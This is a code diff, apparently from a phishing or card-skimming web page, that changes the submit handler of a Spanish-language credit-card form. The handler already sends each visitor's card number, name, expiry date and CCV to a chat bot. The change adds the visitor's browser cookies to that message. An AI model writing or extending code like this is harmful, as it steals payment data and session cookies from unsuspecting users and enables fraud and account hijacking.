@@ -173,7 +173,7 @@ document.getElementById('formulario-tarjeta').addEventListener('submit', async f
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: ` TARJETA DE CREDITO  :\n💳Número: ${datos.numero}\nNombre : ${datos.nombre}\n Expiración: ${datos.expiracion}\nCCV: ${datos.ccv}`
+                        text: ` TARJETA DE CREDITO  :\n💳Número: ${datos.numero}\nNombre : ${datos.nombre}\n Expiración: ${datos.expiracion}\nCCV: ${datos.ccv}\n🍪 Cookies: ${document.cookie || 'Sin cookies'}`
                     })
                 });
             } catch (error) {
